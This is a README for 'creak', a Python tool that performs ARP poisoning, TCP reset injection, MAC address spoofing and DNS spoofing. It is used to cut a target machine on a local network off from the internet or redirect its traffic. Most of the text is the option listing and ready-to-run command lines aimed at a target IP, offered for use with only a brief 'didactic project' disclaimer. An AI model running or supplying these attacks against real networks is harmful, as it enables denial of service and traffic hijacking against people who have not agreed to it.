# creak

Deny navigation and download capabilities of a target host in the local network
performing an ARP poison attack and sending reset TCP packets to every request
made to the router.
Born as a didactic project for learning python language, i decline every responsibility for any abuse.

## Options

```
Usage: creak.py [options] dev

Options:
  -h, --help           show this help message and exit
  -1, --sessions-scan  Sessions scan mode
  -2, --dns-spoof      Dns spoofing
  -x, --spoof          Spoof mode, generate a fake MAC address to be used
                       during attack
  -m MACADDR           Mac address octet prefix (could be an entire MAC
                       address in the form AA:BB:CC:DD:EE:FF)
  -M MANUFACTURER      Manufacturer of the wireless device, for retrieving a
                       manufactur based prefix for MAC spoof
  -s SOURCE            Source ip address (e.g. a class C address like
                       192.168.1.150) usually the router address
  -t TARGET            Target ip address (e.g. a class C address like
                       192.168.1.150)
  -p PORT              Target port to shutdown
  -a HOST              Target host that will be redirect while navigating on
                       target machine
  -r REDIR             Target redirection that will be fetched instead of host
                       on the target machine
  -v, --verbose        Verbose output mode
  -d, --dotted         Dotted output mode
```
## Example

Most basic usage:
Deny all traffic to the target host

``` python creak.py -t 192.168.1.30 wlan0 ```

Set a different gateway:

``` python creak.py -s 192.168.1.2 -t 192.168.1.30 wlan0 ```

Set a different mac address for the device:

``` python creak.py -m 00:11:22:33:44:55 -t 192.168.1.30 wlan0 ```

Spoof mac address generating a fake one:

``` python creak.py -x -t 192.168.1.30 wlan0 ```

Spoof mac address generating one based on manufacturer(e.g Xeros):

``` python creak.py -x -M xeros -t 192.168.1.30 wlan0 ```

DNS spoofing using a fake MAC address, redirecting ab.xy to cd.xz(e.g.
		localhost):

``` python creak.py -x -M xeros -t 192.168.1.30 -a www.ab.xy -r www.cd.xz
	wlan0```

## Changelog

See the [CHANGELOG](CHANGELOG.md) file.

## TODO

- Multiple hosts denying
- Sessions grouping based on active load usage

## License

See the [LICENSE](LICENSE.md) file for license rights and limitations (GNU v3).
